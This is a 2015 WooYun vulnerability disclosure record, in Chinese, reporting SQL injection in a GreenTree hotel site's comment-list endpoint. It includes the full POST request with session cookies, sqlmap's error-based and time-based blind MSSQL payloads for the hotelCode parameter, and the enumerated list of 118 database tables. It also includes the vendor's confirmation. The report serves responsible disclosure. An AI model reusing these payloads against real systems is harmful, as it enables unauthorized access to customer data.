{"id": 71838, "wybug_id": "wooyun-2015-0149567", "wybug_title": "格林豪泰酒店主站存在SQL注入（涉及94w用户）", "wybug_corp": "格林豪泰酒店管理集团", "wybug_author": "miracle", "wybug_date": "2015-10-26 15:43", "wybug_open_date": "2015-12-10 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向公众公开  简要描述：  详细说明：  \nPOST /HotelDetail/GetHotelTopicCommentList HTTP/1.1Content-Length: 210Content-Type: application/x-www-form-urlencodedCookie: ASP.NET_SessionId=uvdak5kntpktusnecu2bcbi4; HotelCookie1=161839%7c%e9%9d%92%e7%9a%ae%e6%a0%91%e5%b9%bf%e4%b8%9c%e7%9c%81%e6%b1%95%e5%a4%b4%e5%b8%82%e9%95%bf%e5%b9%b3%e4%b8%9c%e8%b7%af%e5%9b%bd%e6%96%b0%e8%8a%b1%e5%9b%ad%e9%85%92%e5%ba%97%7chttp%3a%2f%2fa3.greentree.cn%3a8022%2f%2fUploadFiles%2fcrs%2fHotelImg%2f161839%2fLogo%2fLOGO_161839_3.jpg%7c4.6%7c164%7cVatica+Guangdong+Shantou+East+Changping+Road+Guoxin+Garden+Hotel; HotelCookie2=121629%7c%e6%a0%bc%e6%9e%97%e8%b1%aa%e6%b3%b0%e5%b9%bf%e4%b8%9c%e7%9c%81%e5%b9%bf%e5%b7%9e%e5%b8%82%e7%99%bd%e4%ba%91%e5%8c%ba%e9%bb%84%e7%9f%b3%e8%a5%bf%e8%b7%af%e5%bf%ab%e6%8d%b7%e9%85%92%e5%ba%97%7chttp%3a%2f%2fa3.greentree.cn%3a8022%2f%2fUploadFiles%2fcrs%2fHotelImg%2f121629%2fLogo%2fLOGO_121629_3.jpg%7c4.5%7c56%7cGreenTree+Inn+Guangdong+Guangzhou+Baiyun+West+Huangshi+Road+Express+Hotel; HotelCookie3=162509%7c%e9%9d%92%e7%9a%ae%e6%a0%91%e9%9f%a9%e5%9b%bd%e9%a6%96%e5%b0%94%e5%b8%82%e4%b8%9c%e5%a4%a7%e9%97%a8%e9%85%92%e5%ba%97%7chttp%3a%2f%2fa3.greentree.cn%3a8022%2f%2fUploadFiles%2fcrs%2fHotelImg%2f162509%2fLogo%2fLOGO_162509_3.jpg%7c5%7c0%7cVatica+South+Korea+Seoul+Dongdaemun+Design+Plaza+Hotel+; HotelCookie4=; HotelCookie5=; Hm_lvt_0e4a2c65bdaddd66a53422d93daebe68=1445788496,1445788727,1445788792,1445789294; Hm_lpvt_0e4a2c65bdaddd66a53422d93daebe68=1445789294; CitySearchHis=226%24%ef%bf%bd%cf%ba%ef%bf%bd%242015%2f10%2f26+0%3a08%3a42%7c; BAIDUID=B069A3B7DC5038DE580673ADDB1483CE:FG=1; HMACCOUNT=0567E2D7B874F3D0; v=\"2015102523340400035712700121889022|::\"; opxPID=2015102523340400035712700121889022; u=1445787244357|1445787244357|1445787244357|1445787244358|1445787244358|1445787244358|1445787244358|1445787244358|1445787244358|1445787244358|1445787244358|1445787244358|1445787244358|; JSESSIONID=A1040B6EA99108C8901ED3A779063F78Host: www.998.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*hotelCode=11&pagerIndex=1&pagerSize=5\n注入点：hotelCode\n\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: hotelCode (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: hotelCode=11' AND 7584=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7584=7584) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(112)+CHAR(113))) AND 'KGIC'='KGIC&pagerIndex=1&pagerSize=5    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: hotelCode=11' OR 9310=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'ufkN'='ufkN&pagerIndex=1&pagerSize=5---web server operating system: Windows 8.1 or 2012 R2web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.5back-end DBMS: Microsoft SQL Server 2012Database: GTOW[118 tables]+----------------------------------------+| 38ActivityPicture                      || 38ActivityVote                         || ActivityCommon                         || ActivityData                           || ActivityFIFAData                       || ActivityFIFASetting                    || ActivityInfo                           || CheckInMan                             || Cooperation_Details                    || Cooperation_Type                       || HotelGMapInfo                          || HotelInfo                              || HotelInfoView                          || HotelRank                              || HotelRank0                             || HotelRank20140617                      || HotelRankScore                         || HotelTopicComment                      || HotelTopicCommentAppend                || MSpeer_conflictdetectionconfigrequest  || MSpeer_conflictdetectionconfigresponse || MSpeer_lsns                            || MSpeer_originatorid_history            || MSpeer_request                         || MSpeer_response                        || MSpeer_topologyrequest                 || MSpeer_topologyresponse                || MSpub_identity_range                   || MSreplication_objects                  || MSreplication_subscriptions            || MSsnapshotdeliveryprogress             || MSsubscription_agents                  || MSsubscription_properties              || M_BusinessDistrict                     || M_Meun                                 || M_SystemMenu                           || MemberCardType                         || MemberInfo                             || MemberInfo20140617                     || MemberInfo2014061701                   || MemberMessage                          || MemberMessageText                      || MerchantAccounts                       || MerchantAccounts2015051201             || MerchantCollection                     || MerchantComment                        || MerchantCommentRespond                 || MerchantImages                         || MerchantInfo                           || MerchantInfoDesc                       || MerchantScore                          || MerchantType                           || MerchantVoucher                        || MobileCode                             || RoomType                               || SpringtourPicture                      || SpringtourVote                         || TActivityInfo                          || TAdvertisement                         || TBasicParamete                         || TBbsBoard                              || TBbsHits                               || TBbsReply                              || TBbsTopic                              || TBrandType                             || TCouponInfo                            || TCouponInfo20140613                    || TDiscountInfo                          || THelpClass                             || THelpInfo                              || THelpInfo20150902                      || THelpInfo2015090201                    || THelpInfo2015090203                    || THotCity                               || TLinkInfo                              || TNewsInfo                              || TOrderNumber                           || TShopConsigneeAddress                  || TShopCreditsRange                      || TShopGift                              || TShopGiftClass                         || TShopGiftProperty                      || TShopOrder                             || TShopShoppingCart                      || TSiteInfo                              || TSiteSeachHis                          || TUserAvatar                            || TVariable                              || VisitLog2013                           || VisitLog2014                           || VisitLog2014bk20140929                 || VisitLog2015                           || VisitLog2015bk20150203                 || VisitLog2015bk20150206                 || VisitLog2016                           || VisitLog2017                           || WebFilesNews                           || hotelArea                              || iccard_kinds                           || m_HotelColumnDescription               || m_HotelInfoAttack                      || m_PointHotelWay                        || m_RoomInfoAttack                       || m_RoomTypeAttachment                   || m_aroundmappoint                       || m_iccard_kinds                         || syncobj_0x3231443445443443             || syncobj_0x3436333237323335             || sysarticlecolumns                      || sysarticles                            || sysarticleupdates                      || sysextendedarticlesview                || syspublications                        || sysreplservers                         || sysschemaarticles                      || syssubscriptions                       || systranschemas                         || v_HotelArea                            |+----------------------------------------+\n\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 miracle@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-10-26 18:46 厂商回复： 感谢对格林的关注，请勿重复报相同问题， 谢谢配合！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}